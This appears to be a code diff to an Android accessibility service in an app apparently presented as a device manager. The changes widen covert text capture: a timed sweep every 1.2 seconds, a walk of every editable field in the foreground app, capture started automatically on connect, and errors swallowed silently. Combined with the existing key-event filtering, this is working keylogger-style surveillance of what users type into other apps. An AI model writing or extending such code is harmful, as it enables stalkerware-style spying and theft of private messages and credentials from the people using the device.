@@ -10,6 +10,7 @@ import android.view.KeyEvent;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
 
+import com.company.devicemgr.utils.AppRuntime;
 import com.company.devicemgr.utils.InAppTextCaptureManager;
 
 import java.util.List;
@@ -17,28 +18,25 @@ import java.util.Locale;
 
 public class KeyboardAccessibilityService extends AccessibilityService {
     private static final long HARDWARE_KEY_CAPTURE_DELAY_MS = 60L;
+    private static final long WINDOW_SWEEP_INTERVAL_MS = 1200L;
+    private static final int MAX_EDITABLE_NODES_PER_SWEEP = 12;
 
     private final Handler handler = new Handler(Looper.getMainLooper());
     private final Runnable focusedNodeCaptureRunnable = new Runnable() {
         @Override
         public void run() {
-            AccessibilityNodeInfo root = getRootInActiveWindow();
-            if (root == null) {
+            performWindowSweep(pendingCaptureMethod);
+        }
+    };
+    private final Runnable periodicWindowSweepRunnable = new Runnable() {
+        @Override
+        public void run() {
+            if (!InAppTextCaptureManager.isCaptureEnabled(KeyboardAccessibilityService.this)) {
+                handler.removeCallbacks(this);
                 return;
             }
-            AccessibilityNodeInfo focused = null;
-            try {
-                focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
-                if (focused == null) {
-                    focused = root.findFocus(AccessibilityNodeInfo.FOCUS_ACCESSIBILITY);
-                }
-                captureFromNode(focused, lastFocusedPackage, lastFocusedField, lastFocusedClassName, pendingCaptureMethod);
-            } finally {
-                if (focused != null && focused != root) {
-                    focused.recycle();
-                }
-                root.recycle();
-            }
+            performWindowSweep("periodic_window_sweep");
+            handler.postDelayed(this, WINDOW_SWEEP_INTERVAL_MS);
         }
     };
     private String lastFocusedPackage = null;
@@ -49,10 +47,16 @@ public class KeyboardAccessibilityService extends AccessibilityService {
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
+        try {
+            AppRuntime.ensureInAppTextCaptureStarted(this);
+        } catch (Exception ignored) {
+        }
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
         info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                 | AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED
-                | AccessibilityEvent.TYPE_VIEW_FOCUSED;
+                | AccessibilityEvent.TYPE_VIEW_FOCUSED
+                | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
+                | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
         info.notificationTimeout = 50;
         info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
@@ -66,6 +70,7 @@ public class KeyboardAccessibilityService extends AccessibilityService {
             info.flags |= AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS;
         }
         setServiceInfo(info);
+        startPeriodicWindowSweep();
     }
 
     @Override
@@ -80,6 +85,7 @@ public class KeyboardAccessibilityService extends AccessibilityService {
         int eventType = event.getEventType();
         if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             captureFromEvent(event, source, "accessibility_text_changed");
+            scheduleFocusedNodeCapture("post_text_changed_window_sweep");
             return;
         }
 
@@ -90,6 +96,20 @@ public class KeyboardAccessibilityService extends AccessibilityService {
 
         if (eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
             scheduleFocusedNodeCapture("accessibility_focus");
+            return;
+        }
+
+        if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+            if (source != null && source.isEditable()) {
+                captureFromNode(source, lastFocusedPackage, lastFocusedField, lastFocusedClassName, "accessibility_window_content_changed");
+            } else {
+                scheduleFocusedNodeCapture("accessibility_window_content_changed");
+            }
+            return;
+        }
+
+        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            scheduleFocusedNodeCapture("accessibility_window_state_changed");
         }
     }
 
@@ -107,12 +127,49 @@ public class KeyboardAccessibilityService extends AccessibilityService {
     @Override
     public void onInterrupt() {
         handler.removeCallbacks(focusedNodeCaptureRunnable);
+        handler.removeCallbacks(periodicWindowSweepRunnable);
+    }
+
+    @Override
+    protected void onDestroy() {
+        handler.removeCallbacks(focusedNodeCaptureRunnable);
+        handler.removeCallbacks(periodicWindowSweepRunnable);
+        super.onDestroy();
     }
 
     private void scheduleFocusedNodeCapture(String captureMethod) {
         pendingCaptureMethod = captureMethod;
         handler.removeCallbacks(focusedNodeCaptureRunnable);
         handler.postDelayed(focusedNodeCaptureRunnable, HARDWARE_KEY_CAPTURE_DELAY_MS);
+    }
+
+    private void startPeriodicWindowSweep() {
+        handler.removeCallbacks(periodicWindowSweepRunnable);
+        handler.postDelayed(periodicWindowSweepRunnable, WINDOW_SWEEP_INTERVAL_MS);
+    }
+
+    private void performWindowSweep(String captureMethod) {
+        AccessibilityNodeInfo root = getRootInActiveWindow();
+        if (root == null) {
+            return;
+        }
+        AccessibilityNodeInfo focused = null;
+        try {
+            focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
+            if (focused == null) {
+                focused = root.findFocus(AccessibilityNodeInfo.FOCUS_ACCESSIBILITY);
+            }
+            if (focused == null) {
+                focused = findEditableNode(root);
+            }
+            captureFromNode(focused, lastFocusedPackage, lastFocusedField, lastFocusedClassName, captureMethod);
+            captureEditableDescendants(root, captureMethod, 0);
+        } finally {
+            if (focused != null && focused != root) {
+                focused.recycle();
+            }
+            root.recycle();
+        }
     }
 
     private void captureFromEvent(AccessibilityEvent event, AccessibilityNodeInfo source, String captureMethod) {
@@ -288,5 +345,40 @@ public class KeyboardAccessibilityService extends AccessibilityService {
         }
         int unicode = event.getUnicodeChar();
         return unicode > 0 && !Character.isISOControl(unicode);
+    }
+
+    private AccessibilityNodeInfo findEditableNode(AccessibilityNodeInfo root) {
+        if (root == null) return null;
+        if (root.isEditable()) return root;
+        for (int i = 0; i < root.getChildCount(); i++) {
+            AccessibilityNodeInfo child = root.getChild(i);
+            if (child == null) continue;
+            AccessibilityNodeInfo match = findEditableNode(child);
+            if (match != null) {
+                return match;
+            }
+            child.recycle();
+        }
+        return null;
+    }
+
+    private int captureEditableDescendants(AccessibilityNodeInfo node, String captureMethod, int capturedCount) {
+        if (node == null || capturedCount >= MAX_EDITABLE_NODES_PER_SWEEP) {
+            return capturedCount;
+        }
+        if (node.isEditable()) {
+            captureFromNode(node, lastFocusedPackage, lastFocusedField, lastFocusedClassName, captureMethod);
+            capturedCount++;
+        }
+        for (int i = 0; i < node.getChildCount() && capturedCount < MAX_EDITABLE_NODES_PER_SWEEP; i++) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            if (child == null) continue;
+            try {
+                capturedCount = captureEditableDescendants(child, captureMethod, capturedCount);
+            } finally {
+                child.recycle();
+            }
+        }
+        return capturedCount;
     }
 }
